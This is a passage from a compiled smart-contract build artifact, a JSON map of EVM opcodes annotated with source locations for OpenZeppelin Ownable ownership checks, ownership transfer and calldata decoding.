    "3179": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "3181": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "3183": {
      "op": "SHL"
    },
    "3184": {
      "op": "SUB"
    },
    "3185": {
      "fn": "Ownable.owner",
      "offset": [
        1273,
        1279
      ],
      "op": "AND",
      "path": "0"
    },
    "3186": {
      "fn": "Context._msgSender",
      "offset": [
        719,
        729
      ],
      "op": "CALLER",
      "path": "2",
      "statement": 27
    },
    "3187": {
      "branch": 38,
      "fn": "Ownable._checkOwner",
      "offset": [
        1422,
        1445
      ],
      "op": "EQ",
      "path": "0",
      "statement": 28
    },
    "3188": {
      "fn": "Ownable._checkOwner",
      "offset": [
        1414,
        1482
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x672"
    },
    "3191": {
      "branch": 38,
      "fn": "Ownable._checkOwner",
      "offset": [
        1414,
        1482
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "3192": {
      "fn": "Ownable._checkOwner",
      "offset": [
        1414,
        1482
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3194": {
      "fn": "Ownable._checkOwner",
      "offset": [
        1414,
        1482
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3195": {
      "op": "PUSH3",
      "value": "0x461BCD"
    },
    "3199": {
      "op": "PUSH1",
      "value": "0xE5"
    },
    "3201": {
      "op": "SHL"
    },
    "3202": {
      "fn": "Ownable._checkOwner",
      "offset": [
        1414,
        1482
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3203": {
      "fn": "Ownable._checkOwner",
      "offset": [
        1414,
        1482
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "3204": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "3206": {
      "fn": "Ownable._checkOwner",
      "offset": [
        1414,
        1482
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "3208": {
      "fn": "Ownable._checkOwner",
      "offset": [
        1414,
        1482
      ],
      "op": "DUP3",
      "path": "0"
    },
    "3209": {
      "fn": "Ownable._checkOwner",
      "offset": [
        1414,
        1482
      ],
      "op": "ADD",
      "path": "0"
    },
    "3210": {
      "op": "DUP2"
    },
    "3211": {
      "op": "SWAP1"
    },
    "3212": {
      "op": "MSTORE"
    },
    "3213": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "3215": {
      "op": "DUP3"
    },
    "3216": {
      "op": "ADD"
    },
    "3217": {
      "op": "MSTORE"
    },
    "3218": {
      "op": "PUSH32",
      "value": "0x4F776E61626C653A2063616C6C6572206973206E6F7420746865206F776E6572"
    },
    "3251": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "3253": {
      "op": "DUP3"
    },
    "3254": {
      "op": "ADD"
    },
    "3255": {
      "op": "MSTORE"
    },
    "3256": {
      "op": "PUSH1",
      "value": "0x64"
    },
    "3258": {
      "op": "ADD"
    },
    "3259": {
      "fn": "Ownable._checkOwner",
      "offset": [
        1414,
        1482
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x112"
    },
    "3262": {
      "op": "JUMP"
    },
    "3263": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2433,
        2620
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "3264": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2506,
        2522
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3266": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2525,
        2531
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3267": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2525,
        2531
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "3268": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "3270": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "3272": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "3274": {
      "op": "SHL"
    },
    "3275": {
      "op": "SUB"
    },
    "3276": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2541,
        2558
      ],
      "op": "DUP4",
      "path": "0",
      "statement": 29
    },
    "3277": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2541,
        2558
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3278": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2541,
        2558
      ],
      "op": "AND",
      "path": "0"
    },
    "3279": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "3281": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "3283": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "3285": {
      "op": "SHL"
    },
    "3286": {
      "op": "SUB"
    },
    "3287": {
      "op": "NOT"
    },
    "3288": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2541,
        2558
      ],
      "op": "DUP4",
      "path": "0"
    },
    "3289": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2541,
        2558
      ],
      "op": "AND",
      "path": "0"
    },
    "3290": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2541,
        2558
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3291": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2541,
        2558
      ],
      "op": "OR",
      "path": "0"
    },
    "3292": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2541,
        2558
      ],
      "op": "DUP5",
      "path": "0"
    },
    "3293": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2541,
        2558
      ],
      "op": "SSTORE",
      "path": "0"
    },
    "3294": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2573,
        2613
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 30,
      "value": "0x40"
    },
    "3296": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2573,
        2613
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3297": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2525,
        2531
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "3298": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2525,
        2531
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3299": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2525,
        2531
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "3300": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2525,
        2531
      ],
      "op": "AND",
      "path": "0"
    },
    "3301": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2525,
        2531
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "3302": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2525,
        2531
      ],
      "op": "DUP4",
      "path": "0"
    },
    "3303": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2525,
        2531
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "3304": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2573,
        2613
      ],
      "op": "PUSH32",
      "path": "0",
      "value": "0x8BE0079C531659141344CD1FD0A4F28419497F9722A3DAAFE3B4186F6B6457E0"
    },
    "3337": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2573,
        2613
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "3338": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2506,
        2522
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3339": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2573,
        2613
      ],
      "op": "LOG3",
      "path": "0"
    },
    "3340": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2496,
        2620
      ],
      "op": "POP",
      "path": "0"
    },
    "3341": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2433,
        2620
      ],
      "op": "POP",
      "path": "0"
    },
    "3342": {
      "fn": "Ownable._transferOwnership",
      "jump": "o",
      "offset": [
        2433,
        2620
      ],
      "op": "JUMP",
      "path": "0"
    },
    "3343": {
      "op": "JUMPDEST"
    },
    "3344": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "3346": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "3348": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "3350": {
      "op": "SHL"
    },
    "3351": {
      "op": "SUB"
    },
    "3352": {
      "op": "DUP2"
    },
    "3353": {
      "op": "AND"
    },
    "3354": {
      "op": "DUP2"
    },
    "3355": {
      "op": "EQ"
    },
    "3356": {
      "op": "PUSH2",
      "value": "0x9F1"
    },
    "3359": {
      "op": "JUMPI"
    },
    "3360": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "3362": {
      "op": "DUP1"
    },
    "3363": {
      "op": "REVERT"
    },
    "3364": {
      "op": "JUMPDEST"
    },
    "3365": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "3367": {
      "op": "DUP1"
    },
    "3368": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "3370": {
      "op": "DUP1"
    },
    "3371": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "3373": {
      "op": "PUSH1",
      "value": "0x80"
    },
    "3375": {
      "op": "DUP7"
    },
    "3376": {
      "op": "DUP9"
    },
    "3377": {
      "op": "SUB"
    },
    "3378": {
      "op": "SLT"
    },
    "3379": {
      "op": "ISZERO"
    },
    "3380": {
      "op": "PUSH2",
      "value": "0xD3C"
    },
    "3383": {
      "op": "JUMPI"
    },
    "3384": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "3386": {
      "op": "DUP1"
    },
    "3387": {
      "op": "REVERT"
    },
    "3388": {
      "op": "JUMPDEST"
    },
    "3389": {
      "op": "DUP6"
    },
    "3390": {
      "op": "CALLDATALOAD"
    },
    "3391": {
      "op": "PUSH2",
      "value": "0xD47"
    },
    "3394": {
      "op": "DUP2"
    },
    "3395": {
      "op": "PUSH2",
      "value": "0xD0F"
    },
    "3398": {
      "jump": "i",
      "op": "JUMP"
    },
    "3399": {
      "op": "JUMPDEST"
    },
    "3400": {
      "op": "SWAP5"
    },
    "3401": {
      "op": "POP"
    },
    "3402": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "3404": {
      "op": "DUP7"
    },
    "3405": {
      "op": "ADD"
    },
    "3406": {
      "op": "CALLDATALOAD"
    },
    "3407": {
      "op": "SWAP4"
    },
    "3408": {
      "op": "POP"
    },
    "3409": {
      "op": "PUSH1",
      "value": "0x40"
    },
    "3411": {
      "op": "DUP7"
    },
    "3412": {
      "op": "ADD"
    },
    "3413": {
      "op": "CALLDATALOAD"
    },
    "3414": {
      "op": "SWAP3"
    },
    "3415": {
      "op": "POP"
    },
    "3416": {
      "op": "PUSH1",
      "value": "0x60"
    },
    "3418": {
      "op": "DUP7"
    },
    "3419": {
      "op": "ADD"
    },
    "3420": {
      "op": "CALLDATALOAD"
    },
    "3421": {
      "op": "PUSH8",
      "value": "0xFFFFFFFFFFFFFFFF"
    },
    "3430": {
      "op": "DUP1"
    },
    "3431": {
      "op": "DUP3"
    },
    "3432": {
      "op": "GT"
    },
    "3433": {
      "op": "ISZERO"
    },
    "3434": {
      "op": "PUSH2",
      "value": "0xD72"
    },
    "3437": {
      "op": "JUMPI"
    },
    "3438": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "3440": {
      "op": "DUP1"
    },
    "3441": {
      "op": "REVERT"
    },
    "3442": {
      "op": "JUMPDEST"
    },
    "3443": {
      "op": "DUP2"
    },
    "3444": {
      "op": "DUP9"
    },
    "3445": {
      "op": "ADD"
    },
    "3446": {
      "op": "SWAP2"
    },
    "3447": {
      "op": "POP"
    },
    "3448": {
      "op": "DUP9"
    },
    "3449": {
      "op": "PUSH1",
      "value": "0x1F"
    },
    "3451": {
      "op": "DUP4"
    },
    "3452": {
      "op": "ADD"
    },
    "3453": {
      "op": "SLT"
    },
    "3454": {
      "op": "PUSH2",
      "value": "0xD86"
    },
    "3457": {
      "op": "JUMPI"
    },
    "3458": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "3460": {
      "op": "DUP1"
    },
    "3461": {
      "op": "REVERT"
    },
    "3462": {
      "op": "JUMPDEST"
    },
    "3463": {
      "op": "DUP2"
    },
    "3464": {
      "op": "CALLDATALOAD"
    },
    "3465": {
      "op": "DUP2"
    },
    "3466": {
      "op": "DUP2"
    },
    "3467": {
      "op": "GT"
    },
    "3468": {
      "op": "ISZERO"
    },
    "3469": {
      "op": "PUSH2",
      "value": "0xD95"
    },
    "3472": {
      "op": "JUMPI"
    },
    "3473": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "3475": {
      "op": "DUP1"
    },
    "3476": {
      "op": "REVERT"
    },
    "3477": {
      "op": "JUMPDEST"
    },
    "3478": {
      "op": "DUP10"
    },
    "3479": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "3481": {
      "op": "DUP3"
    },
    "3482": {
      "op": "DUP6"
    },
    "3483": {
      "op": "ADD"
    },
    "3484": {
      "op": "ADD"
    },
    "3485": {
      "op": "GT"
    },
    "3486": {
      "op": "ISZERO"
    },
    "3487": {
      "op": "PUSH2",
      "value": "0xDA7"
    },
    "3490": {
      "op": "JUMPI"
    },
    "3491": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "3493": {
      "op": "DUP1"
    },
    "3494": {
      "op": "REVERT"
    },
    "3495": {
      "op": "JUMPDEST"
    },
    "3496": {
      "op": "SWAP7"
    },
    "3497": {
      "op": "SWAP10"
    },
    "3498": {
      "op": "SWAP6"
    },
    "3499": {
      "op": "SWAP9"
    },
    "3500": {
      "op": "POP"
    },
    "3501": {
      "op": "SWAP4"
    },
    "3502": {
      "op": "SWAP7"
    },
    "3503": {
      "op": "POP"
    },
    "3504": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "3506": {
      "op": "ADD"
    },
    "3507": {
      "op": "SWAP5"
    },
    "3508": {
      "op": "SWAP4"
    },
    "3509": {
      "op": "SWAP3"
    },
    "3510": {
      "op": "POP"
    },
    "3511": {
      "op": "POP"
    },
    "3512": {
      "op": "POP"
    },
    "3513": {
      "jump": "o",
      "op": "JUMP"
    },
    "3514": {
      "op": "JUMPDEST"
    },
    "3515": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "3517": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "3519": {
      "op": "DUP3"
    },
    "3520": {
      "op": "DUP5"
    },
    "3521": {
      "op": "SUB"
    },
    "3522": {
      "op": "SLT"
    },
    "3523": {
      "op": "ISZERO"
    },
    "3524": {
      "op": "PUSH2",
      "value": "0xDCC"
    },
    "3527": {
      "op": "JUMPI"
    },
    "3528": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "3530": {
      "op": "DUP1"
    },
    "3531": {
      "op": "REVERT"
    },
    "3532": {
      "op": "JUMPDEST"
    },
    "3533": {
      "op": "DUP2"
    },
    "3534": {
      "op": "CALLDATALOAD"
    },
    "3535": {
      "op": "PUSH2",
      "value": "0xDD7"
    },
    "3538": {
      "op": "DUP2"
    },
    "3539": {
      "op": "PUSH2",
      "value": "0xD0F"
    },
    "3542": {
      "jump": "i",
      "op": "JUMP"
    },
    "3543": {
      "op": "JUMPDEST"
    },
    "3544": {
      "op": "SWAP4"
    },
    "3545": {
      "op": "SWAP3"
    },
    "3546": {
      "op": "POP"
    },
    "3547": {
      "op": "POP"
    },
    "3548": {
      "op": "POP"
    },
    "3549": {
      "jump": "o",
      "op": "JUMP"
    },
    "3550": {
      "op": "JUMPDEST"
    },
    "3551": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "3553": {
      "op": "DUP2"
    },
    "3554": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "3556": {
      "op": "NOT"
    },
    "3557": {
      "op": "DIV"
    },
    "3558": {
      "op": "DUP4"
    },
    "3559": {
      "op": "GT"
    },
    "3560": {
      "op": "DUP3"
    },
    "3561": {
      "op": "ISZERO"
    },
    "3562": {
      "op": "ISZERO"
    },
    "3563": {
      "op": "AND"
    },
    "3564": {
      "op": "ISZERO"
    },
    "3565": {
      "op": "PUSH2",
      "value": "0xE06"
    },
    "3568": {
      "op": "JUMPI"
    },
    "3569": {
      "op": "PUSH4",
      "value": "0x4E487B71"
    },
    "3574": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "3576": {
      "op": "SHL"
    },
    "3577": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "3579": {
      "op": "MSTORE"
    },
    "3580": {
      "op": "PUSH1",
      "value": "0x11"
    },
    "3582": {
      "op": "PUSH1",
      "value": "0x4"
    },
    "3584": {
      "op": "MSTORE"
    },
    "3585": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "3587": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "3589": {
      "op": "REVERT"
    },
    "3590": {
      "op": "JUMPDEST"
    },
    "3591": {
      "op": "POP"
    },
    "3592": {
      "op": "MUL"
    },
    "3593": {
      "op": "SWAP1"
    },
    "3594": {
      "jump": "o",
      "op": "JUMP"
    },
    "3595": {
      "op": "JUMPDEST"
    },
    "3596": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "3598": {
      "op": "DUP3"
    },
    "3599": {
      "op": "PUSH2",
      "value": "0xE28"
    },
    "3602": {
      "op": "JUMPI"
    },
    "3603": {
      "op": "PUSH4",
      "value": "0x4E487B71"
    },
    "3608": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "3610": {
      "op": "SHL"
    },
    "3611": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "3613": {
      "op": "MSTORE"
    },
    "3614": {
      "op": "PUSH1",
      "value": "0x12"
    },
    "3616": {
      "op": "PUSH1",
      "value": "0x4"
    },
    "3618": {
      "op": "MSTORE"
    },
    "3619": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "3621": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "3623": {
      "op": "REVERT"
    },
    "3624": {
      "op": "JUMPDEST"
    },
    "3625": {
      "op": "POP"
    },
    "3626": {
      "op": "DIV"
    },
    "3627": {
      "op": "SWAP1"
    },
    "3628": {
      "jump": "o",
      "op": "JUMP"
    },
    "3629": {
      "op": "JUMPDEST"
    },
    "3630": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "3632": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "3634": {
      "op": "DUP3"
    },
    "3635": {
      "op": "DUP5"
    },
    "3636": {
      "op": "SUB"
    },
    "3637": {
      "op": "SLT"
    },
    "3638": {
      "op": "ISZERO"
    },
    "3639": {
      "op": "PUSH2",
      "value": "0xE3F"
    },
    "3642": {
      "op": "JUMPI"
    },
    "3643": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "3645": {
      "op": "DUP1"
    },
    "3646": {
      "op": "REVERT"
    },
    "3647": {
      "op": "JUMPDEST"
    },
    "3648": {
      "op": "DUP2"
    },
    "3649": {
      "op": "MLOAD"
    },
    "3650": {
      "op": "DUP1"
    },
    "3651": {
      "op": "ISZERO"
    },
    "3652": {
      "op": "ISZERO"
    },
    "3653": {
      "op": "DUP2"
    },
    "3654": {
      "op": "EQ"
    },
    "3655": {
      "op": "PUSH2",
      "value": "0xDD7"
    },
    "3658": {
      "op": "JUMPI"
    },
    "3659": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "3661": {
      "op": "DUP1"
    },
    "3662": {
      "op": "REVERT"
    },
    "3663": {
      "op": "JUMPDEST"
    },
    "3664": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "3666": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "3668": {
      "op": "DUP3"
    },
    "3669": {
      "op": "DUP5"
    },
    "3670": {
      "op": "SUB"
    },
    "3671": {
      "op": "SLT"
    },
    "3672": {
      "op": "ISZERO"
    },
    "3673": {
      "op": "PUSH2",
      "value": "0xE61"
    },
    "3676": {
      "op": "JUMPI"
    },
    "3677": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "3679": {
      "op": "DUP1"
    },
    "3680": {
      "op": "REVERT"
    },
    "3681": {
      "op": "JUMPDEST"
    },
    "3682": {
      "op": "POP"
    },
    "3683": {
      "op": "MLOAD"
    },
    "3684": {
      "op": "SWAP2"
    },
    "3685": {
      "op": "SWAP1"
    },
    "3686": {
      "op": "POP"
    },
    "3687": {
      "jump": "o",
      "op": "JUMP"
    },
    "3688": {
      "op": "JUMPDEST"
    },
    "3689": {
      "op": "DUP1"
    },
    "3690": {
      "op": "MLOAD"
    },
    "3691": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "3693": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "3695": {
      "op": "PUSH1",
      "value": "0x70"
    },
    "3697": {
      "op": "SHL"
    },
    "3698": {
      "op": "SUB"
    },
    "3699": {
      "op": "DUP2"
    },
    "3700": {
      "op": "AND"
    },
    "3701": {
      "op": "DUP2"
    },
    "3702": {
      "op": "EQ"
    },
    "3703": {
      "op": "PUSH2",
      "value": "0xE7F"
    },
    "3706": {
      "op": "JUMPI"
    },
    "3707": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "3709": {
      "op": "DUP1"
    },
    "3710": {
      "op": "REVERT"
    },
    "3711": {
      "op": "JUMPDEST"
    },
    "3712": {
      "op": "SWAP2"
    },
    "3713": {
      "op": "SWAP1"
    },
    "3714": {
      "op": "POP"
    },
    "3715": {
      "jump": "o",
      "op": "JUMP"
    },
    "3716": {
      "op": "JUMPDEST"
    },
    "3717": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "3719": {
      "op": "DUP1"
    },
    "3720": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "3722": {
      "op": "PUSH1",
      "value": "0x60"
    },
    "3724": {
      "op": "DUP5"
    },
    "3725": {
      "op": "DUP7"
    },
    "3726": {
      "op": "SUB"
    },
    "3727": {
      "op": "SLT"
    },
    "3728": {
      "op": "ISZERO"
    },
    "3729": {
      "op": "PUSH2",
      "value": "0xE99"
    },
    "3732": {
      "op": "JUMPI"
    },
    "3733": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "3735": {
      "op": "DUP1"
    },
    "3736": {
      "op": "REVERT"
    },
    "3737": {
      "op": "JUMPDEST"
    },
    "3738": {
      "op": "PUSH2",
      "value": "0xEA2"
    },
    "3741": {
      "op": "DUP5"
    },
    "3742": {
      "op": "PUSH2",
      "value": "0xE68"
    },
    "3745": {
      "jump": "i",
      "op": "JUMP"
    },
    "3746": {
      "op": "JUMPDEST"
    },
    "3747": {
      "op": "SWAP3"
    },
    "3748": {
      "op": "POP"
    },
    "3749": {
      "op": "PUSH2",
      "value": "0xEB0"
    },
    "3752": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "3754": {
      "op": "DUP6"
    },
    "3755": {
      "op": "ADD"
    },
    "3756": {
      "op": "PUSH2",
      "value": "0xE68"
    },
    "3759": {
      "jump": "i",
      "op": "JUMP"
    },
    "3760": {
      "op": "JUMPDEST"
    },
    "3761": {
      "op": "SWAP2"
    },
    "3762": {
      "op": "POP"
    },
    "3763": {
      "op": "PUSH1",
      "value": "0x40"
    },
    "3765": {
      "op": "DUP5"
    },
    "3766": {
      "op": "ADD"
    },
    "3767": {
      "op": "MLOAD"
    },
    "3768": {
      "op": "PUSH4",
      "value": "0xFFFFFFFF"
    },
    "3773": {
      "op": "DUP2"
    },
    "3774": {
      "op": "AND"
    },
    "3775": {
      "op": "DUP2"
    },
    "3776": {
      "op": "EQ"
    },
    "3777": {
      "op": "PUSH2",
      "value": "0xEC9"
    },
    "3780": {
      "op": "JUMPI"
    },
    "3781": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "3783": {
      "op": "DUP1"
    },
    "3784": {
      "op": "REVERT"
    },
    "3785": {
      "op": "JUMPDEST"
    },
    "3786": {
      "op": "DUP1"
    },
    "3787": {
      "op": "SWAP2"
    },
    "3788": {
      "op": "POP"
    },
    "3789": {
      "op": "POP"
    },
    "3790": {
      "op": "SWAP3"
    },
    "3791": {
      "op": "POP"
    },
    "3792": {
      "op": "SWAP3"
    },
    "3793": {
      "op": "POP"
    },
    "3794": {
      "op": "SWAP3"
    },
    "3795": {
      "jump": "o",
      "op": "JUMP"
    },
    "3796": {
      "op": "JUMPDEST"
    },
    "3797": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "3799": {
      "op": "DUP2"
    },
    "3800": {
      "op": "MLOAD"
    },
    "3801": {
      "op": "DUP1"
    },
    "3802": {
      "op": "DUP5"
    },
    "3803": {
      "op": "MSTORE"
    },
    "3804": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "3806": {
      "op": "JUMPDEST"
    },
    "3807": {
      "op": "DUP2"
    },
    "3808": {
      "op": "DUP2"
    },
    "3809": {
      "op": "LT"
    },
    "3810": {
      "op": "ISZERO"
    },
    "3811": {
      "op": "PUSH2",
      "value": "0xEFA"
    },
    "3814": {
      "op": "JUMPI"
    },
    "3815": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "3817": {
      "op": "DUP2"
    },
    "3818": {
      "op": "DUP6"
    },
    "3819": {
      "op": "ADD"
    },
    "3820": {
      "op": "DUP2"
    },
    "3821": {
      "op": "ADD"
    },
    "3822": {
      "op": "MLOAD"
    },
    "3823": {
      "op": "DUP7"
    },
    "3824": {
      "op": "DUP4"
    },
    "3825": {
      "op": "ADD"
    },
    "3826": {
      "op": "DUP3"
    },
    "3827": {
      "op": "ADD"
    },
    "3828": {
      "op": "MSTORE"
    },
    "3829": {
      "op": "ADD"
    },
    "3830": {
      "op": "PUSH2",
      "value": "0xEDE"
    },
    "3833": {
      "op": "JUMP"
    },
    "3834": {
      "op": "JUMPDEST"
    },
    "3835": {
      "op": "DUP2"
    },
    "3836": {
      "op": "DUP2"
    },
    "3837": {
      "op": "GT"
    },
    "3838": {
      "op": "ISZERO"
    },
    "3839": {
      "op": "PUSH2",
      "value": "0xF0C"
    },
    "3842": {
      "op": "JUMPI"
    },
    "3843": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "3845": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "3847": {
      "op": "DUP4"
    },
    "3848": {
      "op": "DUP8"
    },
    "3849": {
      "op": "ADD"
    },
    "3850": {
      "op": "ADD"
    },
    "3851": {
      "op": "MSTORE"
    },
    "3852": {
      "op": "JUMPDEST"
    },
    "3853": {
      "op": "POP"
    },
    "3854": {
      "op": "PUSH1",
      "value": "0x1F"
    },
    "3856": {
      "op": "ADD"
    },
    "3857": {
      "op": "PUSH1",
      "value": "0x1F"
    },
    "3859": {
      "op": "NOT"
    },
    "3860": {
      "op": "AND"
    },
    "3861": {
      "op": "SWAP3"
    },
    "3862": {
      "op": "SWAP1"
    },
    "3863": {
      "op": "SWAP3"
    },
    "3864": {
      "op": "ADD"
    },
    "3865": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "3867": {
      "op": "ADD"
    },
    "3868": {
      "op": "SWAP3"
    },
    "3869": {
      "op": "SWAP2"
    },
    "3870": {
      "op": "POP"
    },
    "3871": {
      "op": "POP"
    },
    "3872": {
      "jump": "o",
      "op": "JUMP"
    },
    "3873": {
      "op": "JUMPDEST"
    },
    "3874": {
      "op": "DUP5"
    },
    "3875": {
      "op": "DUP2"
    },
    "3876": {
      "op": "MSTORE"
    },
    "3877": {
      "op": "DUP4"
    },
    "3878": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "3880": {
      "op": "DUP3"
    },
    "3881": {
      "op": "ADD"
    },
    "3882": {
      "op": "MSTORE"
    },
    "3883": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "3885": {
      "op": "DUP1"
    },
    "3886": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "3888": {
      "op": "SHL"
    },
    "3889": {
      "op": "SUB"
    },
    "3890": {
      "op": "DUP4"
    },
    "3891": {
      "op": "AND"
    },
    "3892": {
      "op": "PUSH1",
      "value": "0x40"
    },
    "3894": {
      "op": "DUP3"
    },
    "3895": {
      "op": "ADD"
    },
    "3896": {
      "op": "MSTORE"
    },
    "3897": {
      "op": "PUSH1",
      "value": "0x80"
    },
    "3899": {
      "op": "PUSH1",
      "value": "0x60"
    },
    "3901": {
      "op": "DUP3"
    },
    "3902": {
      "op": "ADD"
    },
    "3903": {
      "op": "MSTORE"
    },
    "3904": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "3906": {
      "op": "PUSH2",
      "value": "0xF4E"
    },
    "3909": {
      "op": "PUSH1",
      "value": "0x80"
    },
    "3911": {
      "op": "DUP4"
    },
    "3912": {
      "op": "ADD"
    },
    "3913": {
      "op": "DUP5"
    },
    "3914": {
      "op": "PUSH2",
      "value": "0xED4"
    },
    "3917": {
      "jump": "i",
      "op": "JUMP"
    },
    "3918": {
      "op": "JUMPDEST"
    },
    "3919": {
      "op": "SWAP7"
    },
    "3920": {
      "op": "SWAP6"
    },
    "3921": {
      "op": "POP"
    },
    "3922": {
      "op": "POP"
    },
    "3923": {
      "op": "POP"
    },
    "3924": {
      "op": "POP"
    },
    "3925": {
      "op": "POP"
    },
    "3926": {
      "op": "POP"
    },
    "3927": {
      "jump": "o",
      "op": "JUMP"
    }
  },
  "sha1": "1f3e2ea1eb7402c76ad2a9a493d4d0088b4b0b24",
